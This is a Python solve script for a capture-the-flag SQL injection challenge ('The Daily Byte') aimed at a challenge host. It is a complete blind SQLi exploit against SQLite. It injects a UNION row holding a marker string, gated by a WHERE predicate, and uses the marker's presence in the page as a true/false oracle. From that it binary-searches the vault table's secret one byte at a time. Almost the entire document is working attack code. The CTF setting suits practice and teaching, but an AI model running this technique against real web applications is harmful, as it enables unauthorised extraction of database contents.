#!/usr/bin/env python3
"""
The Daily Byte (sqli, 300, hard) — CWE-89 blind CONTENT-based (marker) SQLi (SQLite).

/?tag=... injects into `... WHERE tag = '<tag>'`. Nothing is echoed and there's no
match count, but we can UNION in a fake post whose title is a marker, gated by a
WHERE predicate — the marker appears in the post list only when the predicate is
true. That presence/absence is the oracle; binary-search vault.secret byte by byte.

Marker uses no HTML-special chars so output-escaping can't mangle it.

Usage:
    python3 solve.py                          # defaults to sqli5.chal.deti:8034
    python3 solve.py http://sqli5.chal.deti:8034
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://sqli5.chal.deti:8034"
MARKER = "ZZXMARKERXZZ"

session = requests.Session()
requests_made = 0


def oracle(cond: str) -> bool:
    """Inject a UNION row gated by `cond`; TRUE if the marker post appears."""
    global requests_made
    tag = f"zzz' UNION SELECT 1,'{MARKER}',3,4 WHERE ({cond}) -- "
    r = session.get(f"{BASE}/", params={"tag": tag}, timeout=10)
    requests_made += 1
    return MARKER in r.text


def bsearch(expr: str, lo: int, hi: int) -> int:
    """Smallest v with expr <= v, via the `expr > mid` oracle."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main() -> int:
    length = bsearch("(SELECT length(secret) FROM vault LIMIT 1)", 0, 256)
    print(f"[i] secret length: {length}")

    out = []
    for i in range(1, length + 1):
        expr = f"(SELECT unicode(substr(secret,{i},1)) FROM vault LIMIT 1)"
        out.append(chr(bsearch(expr, 0, 127)))
        sys.stdout.write(out[-1]); sys.stdout.flush()
    print()

    data = "".join(out)
    print(f"[i] requests made: {requests_made}")
    m = re.search(r"flag\{[^}]*\}", data)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] secret:\n{data}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
